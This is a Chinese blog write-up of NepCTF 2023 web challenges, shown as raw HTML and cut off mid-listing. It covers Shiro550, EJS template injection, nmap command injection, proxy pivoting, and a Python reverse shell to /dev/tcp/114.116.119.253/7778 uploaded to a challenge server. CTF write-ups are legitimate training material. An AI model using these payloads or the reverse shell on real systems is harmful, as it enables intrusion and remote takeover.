<!DOCTYPE html>
<html lang="zh-CN">
    <head prefix="og: https://ogp.me/ns#">
  <meta charset="utf-8">
  <meta name="referrer" content="no-referrer" />
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="color-scheme" content="light dark">
  
  <title>NepCTF 2023 Web WriteUp - Boogiepop Doesn&#39;t Laugh</title>
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    <link rel='manifest' href='/manifest.json'>
  

  
  
  
  <meta property="og:title" content="NepCTF 2023 Web WriteUp - Boogiepop Doesn&#39;t Laugh" />
  
  <meta property="og:type" content="article" />
  
  <meta property="og:url" content="http://boogipop.com/2023/08/14/NepCTF%202023%20All%20WriteUP/index.html" />
  
  <meta property="og:image" content="/favicon.png" />
  
  <meta property="og:article:published_time" content="2023-08-14T15:55:14.000Z" />
  
  <meta property="og:article:author" content="Boogipop" />
  
  

  
<link rel="stylesheet" href="/css/var.css">

  
<link rel="stylesheet" href="/css/main.css">

  
<link rel="stylesheet" href="/css/typography.css">

  
<link rel="stylesheet" href="/css/code-highlighting.css">

  
<link rel="stylesheet" href="/css/components.css">

  
<link rel="stylesheet" href="/css/nav.css">

  
<link rel="stylesheet" href="/css/paginator.css">

  
<link rel="stylesheet" href="/css/footer.css">

  
<link rel="stylesheet" href="/css/post-list.css">

  
<link rel="stylesheet" href="/css/giscus.css">

  
  
<link rel="stylesheet" href="/css/rainbow-banner.css">

  
  
  
<link rel="stylesheet" href="/css/toc.css">

  
  
    
<link rel="stylesheet" href="/css/giscus.css">

  
  
  
  
<link rel="stylesheet" href="/css/post.css">

  
  
  
  
  

  
<meta name="generator" content="Hexo 6.3.0"></head>
    <body
        data-color-scheme="auto"
        data-uppercase-categories="true"
        
        data-rainbow-banner="true"
        data-rainbow-banner-shown="auto"
        data-rainbow-banner-month="6"
        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
        
        data-config-root="/"
        
        data-toc="true"
        data-toc-max-depth="2"
        
        
    >
        <nav id="theme-nav">
    <div class="inner">
        <a class="title" href="/">Blog</a>
        <div class="nav-arrow"></div>
        <div class="nav-items">
            <a class="nav-item nav-item-home" href="/">Home</a>
            
            
            <a class="nav-item" href="/archives">Archives</a>
            
            
            
            <a class="nav-item" href="/friends">Friends</a>
            
            
            
            <a class="nav-item" href="/about">About</a>
            
            
            
            <a class="nav-item" href="/categories">Categories</a>
            
            
            
            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
            
            
        </div>
    </div>
</nav>
        
<article class="post">
    <div class="meta">
        
        <div class="categories text-uppercase">
        
            <a href="/categories/WriteUp/">WriteUp</a>
        
        </div>
        

        
        <div class="date" id="date">
            <span>August</span>
            <span>14,</span>
            <span>2023</span>
        </div>
        

        <h2 class="title">NepCTF 2023 Web WriteUp</h2>
    </div>

    <div class="divider"></div>

    <div class="content">
        <p>队伍名：理塘最速传说と绝凶の猛虎<br>RANK：1th</p>
<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="ez-java-checkin"><a href="#ez-java-checkin" class="headerlink" title="ez_java_checkin"></a>ez_java_checkin</h2><p>考点：shiro550<br>看到登录框和cookie直接条件反射shiro。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1691927152509-045fde25-2125-468f-a670-c67985e917f9.png#averageHue=%23f3f2f2&clientId=u95164f81-234e-4&from=paste&height=671&id=ub4a27753&originHeight=839&originWidth=1002&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=64182&status=done&style=none&taskId=ue6328bb4-de4e-4c9b-ba99-a2e1d8c8588&title=&width=801.6" alt="image.png"><br>工具直接梭哈了，find suid提权。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1691927251328-a60916d9-8ab6-4ec1-bc38-a733ceee926e.png#averageHue=%23f8f8f7&clientId=u6a635397-504c-4&from=paste&height=335&id=uef0281f4&originHeight=419&originWidth=935&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=30241&status=done&style=none&taskId=ua08bef0b-4faa-45a1-91ca-7a9b5a97acc&title=&width=748" alt="image.png"></p>
<h2 id="Post-Crad-For-You"><a href="#Post-Crad-For-You" class="headerlink" title="Post Crad For You"></a>Post Crad For You</h2><p>考点：ejs 模板注入<br><a target="_blank" rel="noopener" href="https://inhann.top/2023/03/26/ejs/">https://inhann.top/2023/03/26/ejs/</a><br>本地调试一遍后发现html是有脏数据的，用cve2023的那个payload不行，用的是这个2022的bypass，先拿到题目代码</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">&#x27;fs&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">&quot;crypto&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>()</span><br><span class="line"><span class="keyword">const</span> port = <span class="number">3000</span></span><br><span class="line"></span><br><span class="line">templateDir = path.<span class="title function_">join</span>(__dirname, <span class="string">&#x27;template&#x27;</span>);</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;template&#x27;</span>, templateDir);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">sleep</span>(<span class="params">milliSeconds</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> <span class="title class_">StartTime</span> =<span class="keyword">new</span> <span class="title class_">Date</span>().<span class="title function_">getTime</span>();</span><br><span class="line">    <span class="keyword">let</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (<span class="keyword">new</span> <span class="title class_">Date</span>().<span class="title function_">getTime</span>() &lt;<span class="title class_">StartTime</span>+milliSeconds);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">sendFile</span>(<span class="string">&#x27;./index.html&#x27;</span>, &#123;<span class="attr">root</span>: __dirname&#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/create&#x27;</span>, <span class="keyword">function</span>(<span class="params">req, res</span>) &#123;</span><br><span class="line">    <span class="keyword">let</span> uuid;</span><br><span class="line">    <span class="keyword">let</span> name = req.<span class="property">query</span>.<span class="property">name</span> ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">let</span> address = req.<span class="property">query</span>.<span class="property">address</span> ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">let</span> message = req.<span class="property">query</span>.<span class="property">message</span> ?? <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        uuid = crypto.<span class="title function_">randomUUID</span>();</span><br><span class="line">    &#125; <span class="keyword">while</span> (fs.<span class="title function_">existsSync</span>(<span class="string">`<span class="subst">$&#123;templateDir&#125;</span>/<span class="subst">$&#123;uuid&#125;</span>.ejs`</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (name != <span class="string">&#x27;&#x27;</span> &amp;&amp; address != <span class="string">&#x27;&#x27;</span> &amp;&amp; message != <span class="string">&#x27;&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">let</span> source = [<span class="string">&quot;source&quot;</span>, <span class="string">&quot;source1&quot;</span>, <span class="string">&quot;source2&quot;</span>, <span class="string">&quot;source3&quot;</span>].<span class="title function_">sort</span>(<span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0.5</span> - <span class="title class_">Math</span>.<span class="title function_">random</span>();</span><br><span class="line">            &#125;)</span><br><span class="line">            fs.<span class="title function_">readFile</span>(source[<span class="number">0</span>]+<span class="string">&quot;.html&quot;</span>, <span class="string">&#x27;utf8&#x27;</span>,<span class="keyword">function</span>(<span class="params">err, pageContent</span>)&#123;</span><br><span class="line">                fs.<span class="title function_">writeFileSync</span>(<span class="string">`<span class="subst">$&#123;templateDir&#125;</span>/<span class="subst">$&#123;uuid&#125;</span>.ejs`</span>, pageContent.<span class="title function_">replace</span>(<span class="regexp">/--ID--/g</span>, uuid.<span class="title function_">replace</span>(<span class="regexp">/-/g</span>, <span class="string">&quot;&quot;</span>)));</span><br><span class="line">                <span class="title function_">sleep</span>(<span class="number">2000</span>);</span><br><span class="line">            &#125;)</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&quot;Params `name` or `address` or `message` empty&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span>(err) &#123;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">500</span>).<span class="title function_">send</span>(<span class="string">&quot;Failed to write file&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> res.<span class="title function_">redirect</span>(<span class="string">`/page?pageid=<span class="subst">$&#123;uuid&#125;</span>&amp;name=<span class="subst">$&#123;name&#125;</span>&amp;address=<span class="subst">$&#123;address&#125;</span>&amp;message=<span class="subst">$&#123;message&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/page&#x27;</span>, <span class="function">(<span class="params">req,res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> id = req.<span class="property">query</span>.<span class="property">pageid</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="regexp">/^[0-9A-F]&#123;8&#125;-[0-9A-F]&#123;4&#125;-[4][0-9A-F]&#123;3&#125;-[89AB][0-9A-F]&#123;3&#125;-[0-9A-F]&#123;12&#125;$/i</span>.<span class="title function_">test</span>(id) || !fs.<span class="title function_">existsSync</span>(<span class="string">`<span class="subst">$&#123;templateDir&#125;</span>/<span class="subst">$&#123;id&#125;</span>.ejs`</span>)) &#123;</span><br><span class="line">        res.<span class="title function_">status</span>(<span class="number">404</span>).<span class="title function_">send</span>(<span class="string">&quot;Sorry, no such id&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">`<span class="subst">$&#123;templateDir&#125;</span>/<span class="subst">$&#123;id&#125;</span>.ejs`</span>, req.<span class="property">query</span>);</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(port, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`App listening on port <span class="subst">$&#123;port&#125;</span>`</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
<p>审计过后是不难发现<code>res.render(</code>${templateDir}&#x2F;${id}.ejs<code>, req.query);</code>这段有模板注入的，他把query放进去render了。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1691927854832-3a2e164a-4edc-4a52-b480-6399a2dfd6de.png#averageHue=%23b8b8b8&clientId=u6a635397-504c-4&from=paste&height=697&id=uc349d85a&originHeight=871&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=122026&status=done&style=none&taskId=u9d56c4bd-0201-4c4d-8812-cd2b2552a4e&title=&width=1536" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1691927850685-de3a706f-dc01-4ee0-a41c-7c38118fcd45.png#averageHue=%2321201f&clientId=u6a635397-504c-4&from=paste&height=255&id=u774d38ac&originHeight=319&originWidth=829&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=25131&status=done&style=none&taskId=u69b80818-d008-4fba-80d7-6555cbfc47a&title=&width=663.2" alt="image.png"></p>
<h2 id="独步天下-转生成为镜花水月中的王者"><a href="#独步天下-转生成为镜花水月中的王者" class="headerlink" title="独步天下-转生成为镜花水月中的王者"></a>独步天下-转生成为镜花水月中的王者</h2><p> <img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1691928000783-c38c4148-f35b-45e1-91af-526057a3e4fe.png#averageHue=%23fbfbfb&clientId=u6a635397-504c-4&from=paste&height=594&id=ub214d157&originHeight=742&originWidth=1782&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=110640&status=done&style=none&taskId=ucd5a527c-e8ff-4187-9abf-5724d70a6bc&title=&width=1425.6" alt="image.png"><br>这里其实跟一下是可以发现system这里有命令注入的。直接<code>nmap &quot;asd;sh&quot;</code>就可以获取root权限<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1691928034491-83d4c066-0d18-4651-8564-9c4e552379d1.png#averageHue=%23413933&clientId=u6a635397-504c-4&from=paste&height=562&id=u07fd8849&originHeight=702&originWidth=1407&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1403430&status=done&style=none&taskId=uc3ad3266-80a6-4030-891c-39ec028e49d&title=&width=1125.6" alt="image.png"><br>这一层不难，接下来我们该做的是进行内网探测了。由于题目给了个alive-ports，他开头是<code>#!/bin/bash</code>，我们需要改为<code>#!/bin/sh</code>，这里我就不复现了</p>
<h2 id="独步天下-破除虚妄-探见真实"><a href="#独步天下-破除虚妄-探见真实" class="headerlink" title="独步天下-破除虚妄_探见真实"></a>独步天下-破除虚妄_探见真实</h2><p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1691928093996-f1ccdaa6-830f-49bb-a76f-fc697f293565.png#averageHue=%23413a33&clientId=u6a635397-504c-4&from=paste&height=562&id=ucb06d724&originHeight=702&originWidth=1407&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1431761&status=done&style=none&taskId=u00256a15-d0f7-43e3-8e8a-36022a0d54b&title=&width=1125.6" alt="image.png"><br>探测后可以发现是<code>192.168.200.1:82</code>端口开了一个服务，这里我们可以搭建一个socks5代理出来就行。我用的是venom<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1691928257277-5287784d-6901-4985-b492-7788a17f5e71.png#averageHue=%233c342f&clientId=u6a635397-504c-4&from=paste&height=635&id=u7fb291a0&originHeight=794&originWidth=1630&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=1278728&status=done&style=none&taskId=uba117f1f-eb7c-4b66-98d1-ec0fdb0bad6&title=&width=1304" alt="image.png"><br>做一层socks5代理，用proxifier穿透一下<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1691928300323-039385cd-c4a0-4ede-9d8d-696e24d01892.png#averageHue=%23f7f6f5&clientId=u6a635397-504c-4&from=paste&height=622&id=u09feb8a8&originHeight=777&originWidth=1424&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=72372&status=done&style=none&taskId=u2a4d7f13-a5f1-49d5-a76f-c28f6bcf597&title=&width=1139.2" alt="image.png"><br>已经可以进web界面了<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1691928314799-f4bf0bcf-4da9-4203-a06d-8ae3ee056392.png#averageHue=%23e8ddb3&clientId=u6a635397-504c-4&from=paste&height=778&id=ud05f8fb7&originHeight=972&originWidth=1920&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=90240&status=done&style=none&taskId=u28357b00-3242-4cbf-80cf-681e058a666&title=&width=1536" alt="image.png"><br>ping那边感觉很有问题，抓个包分析一下。<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1691928530995-9d9d976b-9efd-4ca5-8c26-9fccf013251e.png#averageHue=%23303030&clientId=u6a635397-504c-4&from=paste&height=585&id=u5d26b83a&originHeight=731&originWidth=1396&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=197852&status=done&style=none&taskId=u20fbca29-7463-442b-9b15-1b7948e8a6f&title=&width=1116.8" alt="image.png"><br>flag我们是没有权限去读取的，因此我们首先需要弹个shell回来。这里做了一些过滤，但是出题人给了文件上传点。题目是python环境，先看看app.py对上传文件有没有过滤</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, url_for, redirect</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> ctypes</span><br><span class="line"><span class="keyword">import</span> ctypes.util</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">os.environ[<span class="string">&#x27;FLASK_ENV&#x27;</span>] = <span class="string">&#x27;production&#x27;</span></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>] = <span class="string">&#x27;./&#x27;</span></span><br><span class="line"></span><br><span class="line">lib_name=<span class="string">&#x27;./libping.so&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">load_ping_library</span>():</span><br><span class="line">    <span class="comment"># 加载共享库</span></span><br><span class="line">    mylib = ctypes.CDLL(lib_name)</span><br><span class="line">    <span class="keyword">return</span> mylib</span><br><span class="line"></span><br><span class="line">mylib = load_ping_library()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/ping&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ping</span>():</span><br><span class="line">    <span class="keyword">global</span> mylib</span><br><span class="line">    ip_address = request.form[<span class="string">&#x27;ip_address&#x27;</span>]</span><br><span class="line">    result = ctypes.create_string_buffer(<span class="number">4096</span>*<span class="number">2</span>)</span><br><span class="line">    mylib.ping(ip_address.encode(<span class="string">&#x27;utf-8&#x27;</span>), result)</span><br><span class="line">    <span class="keyword">return</span> result.value.decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload_avatar&#x27;</span>, methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload_avatar</span>():</span><br><span class="line">    <span class="keyword">if</span> request.headers.get(<span class="string">&#x27;X-Forwarded-For&#x27;</span>) != <span class="string">&#x27;127.0.0.1&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;You are not allowed to upload files from this IP address.&quot;</span> + <span class="string">&quot; Your IP is: &quot;</span> + request.headers.get(<span class="string">&#x27;X-Forwarded-For&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;file&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        <span class="keyword">return</span> redirect(request.url)</span><br><span class="line">    file = request.files[<span class="string">&#x27;file&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> file.filename == <span class="string">&#x27;&#x27;</span>:</span><br><span class="line">        <span class="keyword">return</span> redirect(request.url)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> allowed_file(file.filename):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Invalid file format. Only PNG files are allowed.&#x27;</span></span><br><span class="line">    <span class="comment"># 限制文件大小为 5KB</span></span><br><span class="line">    MAX_FILE_SIZE = <span class="number">5</span> * <span class="number">1024</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(file.read()) &gt; MAX_FILE_SIZE:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;File too large. Maximum size is 5KB.&#x27;</span></span><br><span class="line">    <span class="comment"># 将文件保存到服务器</span></span><br><span class="line">    file.seek(<span class="number">0</span>)  <span class="comment"># 重置文件读取指针</span></span><br><span class="line">    file.save(os.path.join(app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>], <span class="string">&#x27;avatar.png&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">allowed_file</span>(<span class="params">filename</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;.&#x27;</span> <span class="keyword">in</span> filename <span class="keyword">and</span> filename.rsplit(<span class="string">&#x27;.&#x27;</span>, <span class="number">1</span>)[<span class="number">1</span>].lower() == <span class="string">&#x27;png&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>,port=<span class="number">82</span>,debug=<span class="literal">False</span>,use_reloader=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure>
<p>是一点没过滤。那我们随便上传个png，内容如下</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.popen(<span class="string">&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/114.116.119.253/7778 &lt;&amp;1&quot;&#x27;</span>).read()</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1691928748619-58fc4b45-f75d-407d-86cb-691f595ebd5c.png#averageHue=%237f8f52&clientId=u6a635397-504c-4&from=paste&height=798&id=u3fadfc60&originHeight=997&originWidth=1584&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=204763&status=done&style=none&taskId=u73a88e06-adfc-4606-8d6a-21cf708e524&title=&width=1267.2" alt="image.png"><br>根据题目逻辑，内容会覆盖avator.png，我们读取看看<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1691928781068-f188f1b8-ce72-4efe-a79a-550b5d8baf25.png#averageHue=%232e2e2e&clientId=u6a635397-504c-4&from=paste&height=410&id=udbe4e7ab&originHeight=513&originWidth=1212&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=120051&status=done&style=none&taskId=uc496a35c-ac3c-461b-9d71-bfa81fba4e9&title=&width=969.6" alt="image.png"><br>覆盖成功，我们运行他<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1691928814351-f99775b8-1fed-4677-8805-c61bb290720f.png#averageHue=%23272625&clientId=u6a635397-504c-4&from=paste&height=172&id=u03562361&originHeight=215&originWidth=845&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=16818&status=done&style=none&taskId=u3cfadcc4-68fd-402f-aeb1-319f901d794&title=&width=676" alt="image.png"><br>很轻易的获取到了反弹shell，需要做的是提权，看一下ps -ef有什么可疑进程<br><img src="https://cdn.nlark.com/yuque/0/2023/png/32634994/1691928889746-e7fa540e-4d3f-4be4-93c3-6abba3679f64.png#averageHue=%232a2826&clientId=u6a635397-504c-4&from=paste&height=618&id=u9f4aa509&originHeight=773&originWidth=1476&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=121368&status=done&style=none&taskId=ubce50dbf-b7a7-4aa1-8aaf-0fcdfcaceed&title=&width=1180.8" alt="image.png"><br>有一个identity。我们看看源码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span 